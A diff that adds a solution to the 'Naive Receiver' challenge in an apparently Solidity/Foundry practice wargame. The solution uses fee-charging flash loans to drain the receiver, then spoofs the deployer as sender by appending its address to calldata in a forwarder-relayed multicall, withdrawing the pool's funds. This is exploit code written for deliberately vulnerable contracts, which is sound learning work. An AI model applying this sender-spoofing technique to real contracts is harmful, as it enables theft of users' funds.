@@ -77,7 +77,51 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Build a multicall that:
+        // - calls `flashLoan` 10 times against the `receiver` (each call charges the fixed 1 ETH fee)
+        // - calls `withdraw` but spoofs the caller as `deployer` by appending its address to the calldata
+        bytes[] memory calls = new bytes[](11);
+
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeWithSelector(
+                pool.flashLoan.selector,
+                receiver,
+                address(weth),
+                0, // borrow 0 WETH, just want to trigger the fee
+                bytes("") // no data
+            );
+        }
+
+        // withdraw pool's deposits (which belong to `deployer`) and send to `recovery`.
+        // append `deployer` address to calldata so pool._msgSender() resolves to `deployer`.
+        bytes memory withdrawCall = abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL+WETH_IN_RECEIVER, payable(recovery));
+        withdrawCall = abi.encodePacked(withdrawCall, deployer);
+        calls[10] = withdrawCall;
+
+        // encode multicall(...) payload
+        bytes memory multicallData = abi.encodeWithSelector(pool.multicall.selector, calls);
+
+        // Build signed forwarder request from `player` and execute it (meta-tx)
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: forwarder.nonces(player),
+            data: multicallData,
+            deadline: block.timestamp + 1
+        });
+
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(req)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory sig = abi.encodePacked(r, s, v);
+
+        // single player-signed transaction performs all calls
+        forwarder.execute(req, sig);
+
+
+
+
     }
 
     /**
